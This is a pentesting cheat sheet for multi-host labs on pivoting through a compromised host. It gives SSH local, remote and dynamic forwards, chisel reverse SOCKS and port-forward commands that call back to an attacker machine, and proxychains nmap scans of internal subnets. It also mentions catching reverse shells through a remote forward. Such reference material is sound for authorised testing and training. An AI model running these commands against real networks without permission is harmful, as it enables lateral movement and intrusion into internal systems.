# 🔀 Pivoting & Tunnelling Cheat Sheet

Once you own one host, **pivoting** lets you reach the internal network hiding behind it. This covers SSH tunnels, **chisel**, and **proxychains** — the trio you'll use on most multi-host labs.

> 🧠 **Mental model:** *local* forward = pull a remote port to *you*; *remote* forward = push a port from you to the target's side; *dynamic* = a full SOCKS proxy you route any tool through.

---

## SSH tunnelling

| Type | Command | Effect |
| --- | --- | --- |
| **Local** (`-L`) | `ssh -L 8080:10.0.0.5:80 user@pivot` | `localhost:8080` → reaches `10.0.0.5:80` through the pivot |
| **Remote** (`-R`) | `ssh -R 9001:127.0.0.1:9001 user@pivot` | Expose *your* port 9001 on the pivot (great for catching shells) |
| **Dynamic** (`-D`) | `ssh -D 1080 user@pivot` | SOCKS proxy on `localhost:1080` — route *anything* into the internal net |
| Quiet/background | add `-fN` | `-f` background, `-N` no shell (just the tunnel) |

```bash
# SOCKS proxy into the internal network, then scan through it
ssh -D 1080 -fN user@10.10.10.1
proxychains nmap -sT -Pn 10.0.0.0/24
```

## chisel (when there's no SSH)

A single Go binary that builds a tunnel over HTTP/WebSockets — perfect when you only have a web foothold.

| Side | Command | Notes |
| --- | --- | --- |
| Attacker (server) | `chisel server -p 8000 --reverse` | Listen for the agent |
| Target → **reverse SOCKS** | `chisel client 10.8.0.1:8000 R:socks` | Gives you a SOCKS proxy on attacker `:1080` |
| Reverse port forward | `chisel client 10.8.0.1:8000 R:3389:10.0.0.5:3389` | Pull an internal RDP back to you |
| Forward port | `chisel client 10.8.0.1:8000 1080:socks` | Forward (target-listens) variant |

```bash
# Reverse SOCKS pivot (most common):
# attacker:
chisel server -p 8000 --reverse
# target:
./chisel client 10.8.0.1:8000 R:socks
# then route tools through 127.0.0.1:1080 via proxychains
```

## proxychains

Forces any TCP tool through a proxy (your SSH `-D` or chisel SOCKS).

| Step | Detail |
| --- | --- |
| Config | edit `/etc/proxychains4.conf` |
| Add proxy | last line: `socks5 127.0.0.1 1080` |
| Use it | prefix any command: `proxychains <cmd>` |
| Quiet mode | set `quiet_mode` in the conf to reduce noise |

```bash
proxychains curl http://10.0.0.5
proxychains nmap -sT -Pn -p 80,443,445 10.0.0.5     # must be -sT (TCP connect) over SOCKS
```

> ⚠️ Through a SOCKS proxy you can only do **TCP connect** scans (`nmap -sT -Pn`). SYN scans and ICMP/UDP won't traverse it.

---

## 🧭 Typical workflow

```text
1. Compromise the dual-homed "pivot" host (it can see the internal subnet)
2. Stand up a SOCKS proxy:  ssh -D 1080  (or chisel reverse SOCKS)
3. Point proxychains at 127.0.0.1:1080
4. Enumerate the internal range:  proxychains nmap -sT -Pn 10.0.0.0/24
5. Pull specific services back with -L / chisel R: as needed
```

> 🔗 Catch reverse shells from internal hosts via a remote forward — see [shells](../shells) and [netcat](../netcat).
